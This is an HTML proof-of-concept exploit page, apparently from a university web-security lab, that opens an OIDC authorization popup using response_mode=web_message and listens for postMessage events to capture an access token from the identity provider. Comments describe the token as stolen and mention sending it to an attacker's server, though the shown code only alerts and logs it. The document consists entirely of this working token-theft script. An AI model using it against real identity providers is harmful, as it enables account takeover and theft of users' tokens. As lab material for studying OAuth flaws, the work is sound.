<!DOCTYPE html>
<html>
<body>
<script>
window.addEventListener('message', function(e) {
    // Verify the message is from the IdP's origin
    if (e.origin === 'https://idp-elearning.cloud.nds.rub.de') {
        // Extract the access_token from the received data
        if (e.data.access_token) {
            // Send the stolen token to the attacker's server or display it
            alert('Stolen access_token: ' + e.data.access_token);
            console.log('Access Token:', e.data.access_token);
        }
    }
});

// Open the IdP's authorization URL in a popup
const authUrl = 'https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?' +
    'scope=profile+email+calendar+passwords+photos' +
    '&response_type=code' +
    '&redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify' +
    '&state=ZeIyEOyV0FTGs2olT1xG4Q' +  // Controllable state parameter
    '&code_challenge_method=S256' +
    '&client_id=spa-1' +
    '&code_challenge=VJU3RVuzgLG6-KhPrcOV3wk2llSR-Gk0hgqjPcGFNt0' +
    '&response_mode=web_message' +
    '&idp_verifier=spa-s1';

window.open(authUrl, '_blank');
</script>
</body>
</html>